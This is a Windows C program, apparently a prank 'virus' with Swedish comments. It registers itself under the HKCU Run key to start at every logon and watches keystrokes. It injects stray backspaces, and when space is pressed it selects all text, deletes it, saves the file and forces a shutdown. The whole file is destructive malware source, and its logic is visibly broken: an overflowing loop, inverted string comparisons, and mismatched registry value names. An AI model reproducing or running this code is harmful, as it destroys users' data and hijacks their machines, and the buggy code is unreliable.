#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <conio.h>

void backSpace(short randomAdd)
{
	if(randomAdd)
	{
		int randNum=rand()%4;
		for(int i=0; i<randNum; ++i)
		{
			keybd_event(VK_BACK, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
			Sleep(10);
			keybd_event(VK_BACK, 0x45, KEYEVENTF_KEYUP, 0);
			Sleep(10);
		}
	}
	else
	{
		keybd_event(VK_BACK, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
		Sleep(10);
		keybd_event(VK_BACK, 0x45, KEYEVENTF_KEYUP, 0);
		Sleep(10);
	}
}


void deleteAllAndTurnOff()
{
	keybd_event(VK_LCONTROL, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
	Sleep(10);
	keybd_event(0x41, 0x45, KEYEVENTF_EXTENDEDKEY, 0); // a
	Sleep(10);
	keybd_event(0x41, 0x45, KEYEVENTF_KEYUP, 0); // a
	Sleep(10);
	keybd_event(VK_LCONTROL, 0x45, KEYEVENTF_KEYUP, 0);
	Sleep(10);

	backSpace(0);

	keybd_event(VK_LCONTROL, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
	Sleep(10);
	keybd_event(0x53, 0x45, KEYEVENTF_EXTENDEDKEY, 0); // s
	Sleep(10);
	keybd_event(0x53, 0x45, KEYEVENTF_KEYUP, 0); // s
	Sleep(10);
	keybd_event(VK_LCONTROL, 0x45, KEYEVENTF_KEYUP, 0);
	Sleep(10);

	system("shutdown /s /t 1");
}

int main()
{
	char filePath[MAX_PATH];
	GetModuleFileName(NULL, filePath, MAX_PATH);
	if(filePath[0]=='\0')
		exit(1);
	
	
	
	if(!RegGetValue(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", "EvilSoftware", RRF_RT_REG_SZ, 0, 0, 0)) // kollar så att den inte redan är nerskriven
	{

		HKEY hkey;
		LONG key = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", 0, KEY_WRITE, &hkey);
		if (ERROR_SUCCESS == key)
		{
			key = RegSetValueEx(hkey, "VirusProgrammet", 0, REG_SZ, (BYTE*)filePath, strlen(filePath));
		}
		else
		{
			exit(1);
		}
	}

	char keyMap[9]="123456789";
	while(1)
	{
		// 1 2 3 4 5 6  7 8 9
		// s p a c e \  b a r
		char key;
		if(GetAsyncKeyState(0x53))//s osv
			key='s';
		else if(GetAsyncKeyState(0x50))
			key='p';
		else if(GetAsyncKeyState(0x41))
			key='a';
		else if(GetAsyncKeyState(0x43))
			key='c';
		else if(GetAsyncKeyState(0x45))
			key='e';
		else if(GetAsyncKeyState(0x42))
			key='b';
		else if(GetAsyncKeyState(0x52))
			key='r';
		else if(GetAsyncKeyState(VK_SPACE))
			key=' ';
		else if(GetAsyncKeyState(VK_LWIN))
			key='W';

		if(GetAsyncKeyState(VK_BACK))
				backSpace(1);

		for(int i=8; i>0; ++i)
			keyMap[i]=keyMap[i-1];
		keyMap[0]=key;

		if(strcmp(keyMap, "spacebar"))
		{
			for(int i=0; i<9; ++i)
			{
				backSpace(0);
			}
		}

		if(strcmp(keyMap, "WWWWWWWWW"))
		{
			HKEY hkey = HKEY_CURRENT_USER;
			RegOpenKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", &hkey);
			RegDeleteValue(hkey, "EvilSoftware");
			RegCloseKey(hkey);
			exit(0);
		}


		if(key==' ')
		{
			deleteAllAndTurnOff();
		}
			
	}
}

/*
 * stäng av *
HKEY hkey = HKEY_CURRENT_USER;
RegOpenKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", &hkey);
RegDeleteValue(hkey, "EvilSoftware");
RegCloseKey(hkey);
 */
